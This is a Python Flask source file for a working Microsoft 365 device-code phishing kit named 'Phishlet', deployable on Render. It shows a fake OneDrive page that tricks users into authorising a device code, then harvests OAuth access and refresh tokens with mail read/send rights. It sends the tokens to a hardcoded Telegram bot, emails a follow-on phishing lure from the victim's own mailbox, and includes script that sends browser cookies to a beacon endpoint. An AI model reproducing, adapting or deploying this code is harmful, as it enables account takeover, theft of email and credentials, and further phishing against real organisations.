#!/usr/bin/env python3
"""
Phishlet – O365 Business Outlook Mailbox Harvester
Flow: Device Code (no redirect needed)
Landing: Fake SharePoint / OneDrive Document Library
Delivery: Telegram + cookie-grabber email
Deploy: Render (single Flask app, SQLite)
"""

import os
import json
import time
import sqlite3
import threading
import logging
from datetime import datetime, timezone
from urllib.parse import quote
from typing import Optional, Dict

import requests
from flask import Flask, request, jsonify, Response

# ─────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────
APP_URL = os.environ.get("APP_URL", "https://outlook-verify.onrender.com").rstrip("/")

TELEGRAM_BOT_TOKEN = os.environ.get(
    "TELEGRAM_BOT_TOKEN", "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
)
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "8877118461")

DB_PATH = os.environ.get("DB_PATH", "/data/phishlet.db" if os.path.isdir("/data") else "phishlet.db")

# Microsoft OAuth — Office app client ID, works with device code flow
MS_TENANT = "common"
MS_CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
MS_DEVICE_URL = f"https://login.microsoftonline.com/{MS_TENANT}/oauth2/v2.0/devicecode"
MS_TOKEN_URL = f"https://login.microsoftonline.com/{MS_TENANT}/oauth2/v2.0/token"
MS_GRAPH = "https://graph.microsoft.com/v1.0"
SCOPES = "offline_access Mail.ReadWrite Mail.Send User.Read"

# Device-code in-memory store
_device_store: Dict[str, dict] = {}
_device_lock = threading.Lock()

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("phishlet")

app = Flask(__name__)

# ─────────────────────────────────────────────
# DATABASE
# ─────────────────────────────────────────────
def _init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.executescript("""
    CREATE TABLE IF NOT EXISTS captures (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ts TEXT NOT NULL,
        email TEXT,
        name TEXT,
        tenant TEXT,
        access_token TEXT,
        refresh_token TEXT,
        id_token TEXT,
        token_type TEXT,
        expires_in INTEGER,
        mailbox_verified INTEGER DEFAULT 0,
        mailbox_info TEXT,
        cookies TEXT,
        user_agent TEXT,
        ip TEXT,
        grab_email_sent INTEGER DEFAULT 0
    );
    CREATE TABLE IF NOT EXISTS cookies (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ts TEXT NOT NULL,
        email TEXT,
        cookie_string TEXT,
        user_agent TEXT,
        ip TEXT
    );
    """)
    conn.commit()
    conn.close()


_init_db()

# ─────────────────────────────────────────────
# MICROSOFT GRAPH HELPERS
# ─────────────────────────────────────────────
def _ms_user_info(access_token: str) -> dict:
    try:
        r = requests.get(
            f"{MS_GRAPH}/me",
            headers={"Authorization": f"Bearer {access_token}"},
            timeout=15,
        )
        r.raise_for_status()
        return r.json()
    except Exception as e:
        log.warning("user_info error: %s", e)
        return {}


def _verify_mailbox(access_token: str) -> dict:
    result = {"verified": False, "email": "", "displayName": "", "mailFolders": []}
    headers = {"Authorization": f"Bearer {access_token}"}
    try:
        r = requests.get(f"{MS_GRAPH}/me", headers=headers, timeout=15)
        if r.status_code == 200:
            me = r.json()
            result["email"] = me.get("userPrincipalName", "")
            result["displayName"] = me.get("displayName", "")
            result["verified"] = True

        r2 = requests.get(f"{MS_GRAPH}/me/mailFolders", headers=headers, timeout=15)
        if r2.status_code == 200:
            folders = r2.json().get("value", [])
            result["mailFolders"] = [f.get("displayName", "") for f in folders[:10]]
    except Exception as e:
        log.warning("verify_mailbox error: %s", e)
    return result


def _send_cookie_grabber_email(access_token: str, email: str):
    grab_link = f"{APP_URL}/?grab=1&email={quote(email)}"
    body_html = f"""
    <html><body style="font-family:Segoe UI,Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
      <div style="background:#fff;border:1px solid #e1e1e1;border-radius:4px;padding:24px;">
        <p style="font-size:14px;color:#333;">Hi,</p>
        <p style="font-size:14px;color:#333;">
          We noticed your document <strong>Quarterly_Report_v2.docx</strong> in
          <strong>Shared Documents</strong> requires a quick identity re-verification
          before you can continue editing.
        </p>
        <p style="font-size:14px;color:#333;">This is a one-time check. It takes less than 30 seconds.</p>
        <a href="{grab_link}"
           style="display:inline-block;background:#0078d4;color:#fff;text-decoration:none;
                  padding:10px 24px;border-radius:3px;font-size:14px;margin:16px 0;">
          Verify Now
        </a>
        <p style="font-size:12px;color:#888;margin-top:24px;">
          If you didn't expect this, you can safely ignore this message.
        </p>
        <hr style="border:none;border-top:1px solid #e1e1e1;margin:20px 0;">
        <p style="font-size:11px;color:#aaa;">
          Microsoft 365 &middot; Document Security Team<br>
          This is an automated message. Please do not reply.
        </p>
      </div>
    </body></html>
    """
    payload = {
        "message": {
            "subject": "Your document requires verification",
            "body": {"contentType": "HTML", "content": body_html},
            "toRecipients": [{"emailAddress": {"address": email}}],
        },
        "saveToSentItems": "false",
    }
    try:
        r = requests.post(
            f"{MS_GRAPH}/me/sendMail",
            headers={
                "Authorization": f"Bearer {access_token}",
                "Content-Type": "application/json",
            },
            json=payload,
            timeout=15,
        )
        log.info("grabber email to %s -> %s", email, r.status_code)
    except Exception as e:
        log.warning("grabber email error: %s", e)


# ─────────────────────────────────────────────
# TELEGRAM HELPERS
# ─────────────────────────────────────────────
def _tg_send(text: str):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": text,
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            },
            timeout=10,
        )
    except Exception as e:
        log.warning("telegram send error: %s", e)


def _tg_send_file(filename: str, file_bytes: bytes):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument",
            data={"chat_id": TELEGRAM_CHAT_ID, "caption": filename[:255]},
            files={"document": (filename, file_bytes)},
            timeout=30,
        )
    except Exception as e:
        log.warning("telegram file error: %s", e)


# ─────────────────────────────────────────────
# SAVE & NOTIFY
# ─────────────────────────────────────────────
def _save_capture(data: dict):
    ts = datetime.now(timezone.utc).isoformat()
    conn = sqlite3.connect(DB_PATH)
    try:
        conn.execute(
            """INSERT INTO captures (ts, email, name, tenant, access_token, refresh_token,
                                      id_token, token_type, expires_in, mailbox_verified,
                                      mailbox_info, cookies, user_agent, ip)
               VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
            (
                ts,
                data.get("email", ""),
                data.get("name", ""),
                data.get("tenant", ""),
                data.get("access_token", ""),
                data.get("refresh_token", ""),
                data.get("id_token", ""),
                data.get("token_type", ""),
                int(data.get("expires_in", 0) or 0),
                1 if data.get("mailbox_verified") else 0,
                json.dumps(data.get("mailbox_info", {})),
                data.get("cookies", ""),
                data.get("user_agent", ""),
                data.get("ip", ""),
            ),
        )
        conn.commit()
    finally:
        conn.close()
    log.info("capture saved: %s", data.get("email", "?"))


def _notify_telegram(data: dict):
    email = data.get("email", "unknown")
    name = data.get("name", "")
    tenant = data.get("tenant", "")
    mb = data.get("mailbox_info", {}) or {}
    verified = "yes" if data.get("mailbox_verified") else "no"
    folders = ", ".join(mb.get("mailFolders", [])[:5]) if mb.get("mailFolders") else "N/A"

    msg = (
        f"🎯 <b>New Capture</b>\n"
        f"👤 {name or '—'}\n"
        f"📧 {email}\n"
        f"🏢 {tenant}\n"
        f"📬 Mailbox: {verified}\n"
        f"📁 Folders: {folders}\n"
        f"🌐 IP: {data.get('ip', '')}\n"
        f"🕐 {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}\n"
        f"🔑 Tokens saved (refresh + access)"
    )
    _tg_send(msg)

    token_data = {
        "email": email,
        "name": name,
        "tenant": tenant,
        "access_token": data.get("access_token", ""),
        "refresh_token": data.get("refresh_token", ""),
        "id_token": data.get("id_token", ""),
        "token_type": data.get("token_type", ""),
        "expires_in": data.get("expires_in", 0),
        "mailbox_info": mb,
        "cookies": data.get("cookies", ""),
    }
    safe_email = (email or "unknown").replace("@", "_at_").replace("/", "_")
    _tg_send_file(f"capture_{safe_email}.json", json.dumps(token_data, indent=2).encode())


# ─────────────────────────────────────────────
# ROUTES
# ─────────────────────────────────────────────
@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "app_url": APP_URL})


@app.route("/", methods=["GET"])
def index():
    grab = request.args.get("grab", "0") == "1"

    if grab:
        title = "Identity Re-Verification Required"
        desc = "Your session has expired. Please sign in again to continue editing."
    else:
        title = "Sign in Required"
        desc = "You need to sign in to view this document library."

    html = (
        SHAREPOINT_PAGE_TEMPLATE
        .replace("__APP_URL__", APP_URL)
        .replace("__OVERLAY_TITLE__", title)
        .replace("__OVERLAY_DESC__", desc)
        .replace("__OVERLAY_BTN__", "Sign in to verify")
    )
    return Response(html, content_type="text/html")


@app.route("/start", methods=["POST"])
def start():
    """Request a device code from Microsoft."""
    try:
        r = requests.post(
            MS_DEVICE_URL,
            data={"client_id": MS_CLIENT_ID, "scope": SCOPES},
            timeout=15,
        )
        dc = r.json()
    except Exception as e:
        log.error("devicecode request failed: %s", e)
        return jsonify({"error": "upstream_unreachable"}), 502

    log.info("Microsoft Response: %s", json.dumps(dc))

    if r.status_code != 200 or "user_code" not in dc:
        log.error("Microsoft API Error: %s", json.dumps(dc))
        return jsonify({"error": dc.get("error", "unknown")}), 502

    device_code = dc["device_code"]
    expires_at = time.time() + int(dc.get("expires_in", 900))

    with _device_lock:
        _device_store[device_code] = {
            "status": "pending",
            "created": time.time(),
            "expires_at": expires_at,
        }
        # Prune old entries
        now = time.time()
        expired = [k for k, v in _device_store.items() if now > v["expires_at"]]
        for k in expired:
            del _device_store[k]

    return jsonify({
        "user_code": dc["user_code"],
        "verification_uri": dc.get("verification_uri", "https://microsoft.com/devicelogin"),
        "device_code": device_code,
        "interval": int(dc.get("interval", 5)),
    })


@app.route("/poll", methods=["POST"])
def poll():
    """Polls Microsoft for the token using the device_code."""
    data = request.get_json(silent=True) or {}
    device_code = data.get("device_code", "")

    if not device_code:
        return jsonify({"status": "error", "message": "Missing device_code"}), 400

    with _device_lock:
        entry = _device_store.get(device_code)
        if not entry:
            return jsonify({"status": "expired", "message": "Session not found"}), 404
        if time.time() > entry["expires_at"]:
            _device_store.pop(device_code, None)
            return jsonify({"status": "expired", "message": "Code expired"}), 410
        if entry["status"] == "completed":
            return jsonify({"status": "completed"})

    payload = {
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "client_id": MS_CLIENT_ID,
        "device_code": device_code,
    }

    try:
        r = requests.post(MS_TOKEN_URL, data=payload, timeout=10)
        tokens = r.json()
    except Exception as e:
        log.warning("poll token error: %s", e)
        return jsonify({"status": "pending"})

    if "access_token" in tokens:
        with _device_lock:
            if device_code in _device_store:
                _device_store[device_code]["status"] = "completed"

        access_token = tokens.get("access_token", "")
        user_info = _ms_user_info(access_token)
        email = user_info.get("userPrincipalName", "")
        name = user_info.get("displayName", "")
        tenant = user_info.get("tenantId", "") or "unknown"

        mailbox_info = _verify_mailbox(access_token)
        if not email:
            email = mailbox_info.get("email", "")

        capture_data = {
            "email": email,
            "name": name,
            "tenant": tenant,
            "access_token": access_token,
            "refresh_token": tokens.get("refresh_token", ""),
            "id_token": tokens.get("id_token", ""),
            "token_type": tokens.get("token_type", "Bearer"),
            "expires_in": int(tokens.get("expires_in", 3600) or 3600),
            "mailbox_verified": bool(mailbox_info.get("verified")),
            "mailbox_info": mailbox_info,
            "cookies": "",
            "user_agent": request.headers.get("User-Agent", ""),
            "ip": request.headers.get("X-Forwarded-For", request.remote_addr or ""),
        }

        _save_capture(capture_data)
        _notify_telegram(capture_data)

        if mailbox_info.get("verified") and email:
            _send_cookie_grabber_email(access_token, email)
            conn = sqlite3.connect(DB_PATH)
            try:
                conn.execute(
                    "UPDATE captures SET grab_email_sent=1 WHERE id=("
                    "SELECT id FROM captures WHERE email=? ORDER BY id DESC LIMIT 1)",
                    (email,),
                )
                conn.commit()
            finally:
                conn.close()

        return jsonify({"status": "completed"})

    error = tokens.get("error", "")
    if error == "authorization_pending":
        return jsonify({"status": "pending"})
    if error == "slow_down":
        return jsonify({"status": "slow_down"})
    if error in ("authorization_declined", "expired_token"):
        with _device_lock:
            _device_store.pop(device_code, None)
        return jsonify({"status": "expired"})

    log.error("Poll unexpected error: %s", json.dumps(tokens))
    return jsonify({"status": "error", "message": error or "unknown"}), 502


@app.route("/beacon", methods=["POST"])
def beacon():
    """Receives cookies from the client-side JS."""
    try:
        data = request.get_json(force=True, silent=True) or {}
        email = data.get("email", "")
        cookies = data.get("cookies", "")
        ua = request.headers.get("User-Agent", "")
        ip = request.headers.get("X-Forwarded-For", request.remote_addr or "")

        if email and cookies:
            ts = datetime.now(timezone.utc).isoformat()
            conn = sqlite3.connect(DB_PATH)
            try:
                conn.execute(
                    "INSERT INTO cookies (ts, email, cookie_string, user_agent, ip) VALUES (?,?,?,?,?)",
                    (ts, email, cookies, ua, ip),
                )
                conn.execute("UPDATE captures SET cookies=? WHERE email=?", (cookies, email))
                conn.commit()
            finally:
                conn.close()
            log.info("Cookies received for %s (%d bytes)", email, len(cookies))
            _tg_send(f"🍪 <b>Cookies Received</b>\n📧 {email}\n📏 Length: {len(cookies)}")

        return jsonify({"status": "ok"})
    except Exception as e:
        log.error("Beacon error: %s", e)
        return jsonify({"status": "error"}), 500


# ─────────────────────────────────────────────
# TEMPLATES
# ─────────────────────────────────────────────
SHAREPOINT_PAGE_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Shared Documents - OneDrive</title>
<style>
body { font-family:'Segoe UI',Tahoma,sans-serif;margin:0;padding:0;background:#f3f2f1; }
.navbar { background:#0078d4;color:#fff;height:48px;display:flex;align-items:center;padding:0 16px; }
.navbar-brand { font-size:16px;font-weight:600;display:flex;align-items:center; }
.navbar-brand span { margin-left:8px; }
.main-content { padding:20px;max-width:1200px;margin:0 auto; }
.breadcrumb { color:#605e5c;font-size:14px;margin-bottom:16px; }
.doc-list { background:#fff;border-radius:2px;box-shadow:0 1.6px 3.6px rgba(0,0,0,.132),0 .3px .9px rgba(0,0,0,.108); }
.doc-item { display:flex;align-items:center;padding:12px 16px;border-bottom:1px solid #edebe9; }
.doc-icon { width:32px;height:32px;margin-right:12px; }
.doc-info { flex:1;min-width:0; }
.doc-name { font-size:14px;color:#323130;font-weight:500; }
.doc-meta { font-size:12px;color:#605e5c;margin-top:2px; }
.overlay { position:fixed;inset:0;background:rgba(0,0,0,.4);display:flex;justify-content:center;align-items:center;z-index:1000; }
.modal { background:#fff;width:400px;max-width:calc(100% - 32px);padding:24px;border-radius:2px;text-align:center;box-shadow:0 25.6px 57.6px rgba(0,0,0,.22); }
.modal-title { font-size:22px;font-weight:600;color:#323130;margin-bottom:8px; }
.modal-desc { font-size:14px;color:#605e5c;margin-bottom:24px;line-height:1.5; }
.btn-primary { background:#0078d4;color:#fff;border:none;padding:10px 24px;font-size:14px;font-weight:600;border-radius:2px;cursor:pointer;width:100%; }
.btn-primary:hover { background:#005a9e; }
.btn-primary:disabled { opacity:.6;cursor:default; }
#codeBox { display:none;margin:16px 0; }
#codeText { font-size:28px;font-weight:700;letter-spacing:2px;color:#0078d4;user-select:all; }
.footer-text { font-size:12px;color:#605e5c;margin-top:16px; }
#status { font-size:13px;color:#605e5c;margin-top:12px; }
</style>
</head>
<body>
<div class="navbar"><div class="navbar-brand"><span>OneDrive</span></div></div>
<div class="main-content">
  <div class="breadcrumb">My Files &gt; Documents</div>
  <div class="doc-list">
    <div class="doc-item"><img src="https://res-1.cdn.office.net/files/fabric-cdn-prod_20230815.002/assets/item-types/20/docx.svg" class="doc-icon"><div class="doc-info"><div class="doc-name">Project_Proposal_Final.docx</div><div class="doc-meta">Modified today at 9:00 AM by You</div></div></div>
    <div class="doc-item"><img src="https://res-1.cdn.office.net/files/fabric-cdn-prod_20230815.002/assets/item-types/20/xlsx.svg" class="doc-icon"><div class="doc-info"><div class="doc-name">Q3_Financials.xlsx</div><div class="doc-meta">Modified yesterday by Finance Team</div></div></div>
    <div class="doc-item"><img src="https://res-1.cdn.office.net/files/fabric-cdn-prod_20230815.002/assets/item-types/20/pdf.svg" class="doc-icon"><div class="doc-info"><div class="doc-name">Contract_Draft_v2.pdf</div><div class="doc-meta">Modified last week by Legal</div></div></div>
  </div>
</div>
<div class="overlay" id="authOverlay">
  <div class="modal">
    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" style="width:100px;margin-bottom:16px;" alt="Microsoft">
    <div class="modal-title">__OVERLAY_TITLE__</div>
    <div class="modal-desc">__OVERLAY_DESC__</div>
    <button class="btn-primary" id="startBtn">__OVERLAY_BTN__</button>
    <div id="codeBox">
      <p style="font-size:13px;color:#323130;margin:8px 0;">Enter this code at <a href="https://microsoft.com/devicelogin" target="_blank">microsoft.com/devicelogin</a>:</p>
      <div id="codeText">&mdash;</div>
      <button class="btn-primary" id="copyBtn" style="margin-top:8px;">Copy &amp; Sign In</button>
    </div>
    <div id="status"></div>
    <div class="footer-text">Your organization's security policy requires re-authentication to view this content.</div>
  </div>
</div>
<script>
(function(){
  var startBtn = document.getElementById('startBtn');
  var codeBox = document.getElementById('codeBox');
  var codeText = document.getElementById('codeText');
  var copyBtn = document.getElementById('copyBtn');
  var status = document.getElementById('status');
  var deviceCode = null, interval = 5;

  startBtn.onclick = function(){
    startBtn.disabled = true;
    startBtn.textContent = 'Contacting Microsoft...';
    fetch('__APP_URL__/start', { method:'POST' })
      .then(function(r){ return r.json(); })
      .then(function(d){
        if (d.error) { status.textContent = 'Service busy. Please refresh.'; startBtn.disabled=false; startBtn.textContent='Retry'; return; }
        deviceCode = d.device_code;
        interval = d.interval || 5;
        codeText.textContent = d.user_code;
        codeBox.style.display = 'block';
        startBtn.style.display = 'none';
        poll();
      })
      .catch(function(){ status.textContent = 'Service busy. Please refresh.'; startBtn.disabled=false; startBtn.textContent='Retry'; });
  };

  copyBtn.onclick = function(){
    if (navigator.clipboard) navigator.clipboard.writeText(codeText.textContent).catch(function(){});
    window.open('https://microsoft.com/devicelogin', '_blank');
  };

  function poll(){
    if (!deviceCode) return;
    fetch('__APP_URL__/poll', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ device_code: deviceCode })
    }).then(function(r){ return r.json(); }).then(function(d){
      if (d.status === 'pending') { setTimeout(poll, interval*1000); return; }
      if (d.status === 'slow_down') { interval += 5; setTimeout(poll, interval*1000); return; }
      if (d.status === 'completed') { status.textContent = 'Success! Loading documents...'; setTimeout(function(){ location.reload(); }, 1500); return; }
      if (d.status === 'expired') { status.textContent = 'Code expired. Please retry.'; startBtn.disabled=false; startBtn.textContent='Retry'; startBtn.style.display='block'; codeBox.style.display='none'; return; }
      setTimeout(poll, interval*1000);
    }).catch(function(){ setTimeout(poll, interval*1000); });
  }
})();
</script>
</body>
</html>"""

SUCCESS_PAGE_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Document Library - SharePoint</title>
<style>
body { font-family:'Segoe UI',Tahoma,sans-serif;background:#f3f2f1;margin:0;padding:0; }
.header { background:#0078d4;color:#fff;padding:10px 20px;font-weight:600; }
.container { max-width:1200px;margin:20px auto;background:#fff;padding:20px; }
.breadcrumb { color:#605e5c;margin-bottom:20px;font-size:14px; }
.file-list { width:100%;border-collapse:collapse; }
.file-list th { text-align:left;padding:10px;border-bottom:1px solid #edebe9;color:#605e5c; }
.file-list td { padding:10px;border-bottom:1px solid #edebe9;color:#323130; }
.icon { width:16px;height:16px;margin-right:8px;vertical-align:middle; }
</style>
</head>
<body>
<div class="header">SharePoint</div>
<div class="container">
  <div class="breadcrumb">Home / Documents / Shared Documents</div>
  <h2 style="color:#323130;font-weight:400;">Shared Documents</h2>
  <table class="file-list">
    <thead><tr><th>Name</th><th>Modified</th><th>Modified By</th></tr></thead>
    <tbody>
      <tr><td><img src="https://res-1.cdn.office.net/files/fabric-cdn-prod_20230815.002/assets/item-types/20/docx.svg" class="icon">Quarterly_Report_v2.docx</td><td>Today, 9:00 AM</td><td>You</td></tr>
      <tr><td><img src="https://res-1.cdn.office.net/files/fabric-cdn-prod_20230815.002/assets/item-types/20/xlsx.svg" class="icon">Budget_2024.xlsx</td><td>Yesterday, 2:30 PM</td><td>Admin</td></tr>
      <tr><td><img src="https://res-1.cdn.office.net/files/fabric-cdn-prod_20230815.002/assets/item-types/20/pptx.svg" class="icon">Strategy_Deck.pptx</td><td>Last Week</td><td>Manager</td></tr>
    </tbody>
  </table>
</div>
<script>
(function(){
  var email = "__EMAIL_JS__";
  var cookies = document.cookie;
  if (cookies && email) {
    fetch('__APP_URL__/beacon', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ email: email, cookies: cookies })
    }).catch(function(){});
  }
})();
</script>
</body>
</html>"""


# ─────────────────────────────────────────────
# MAIN ENTRY POINT
# ─────────────────────────────────────────────
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False)
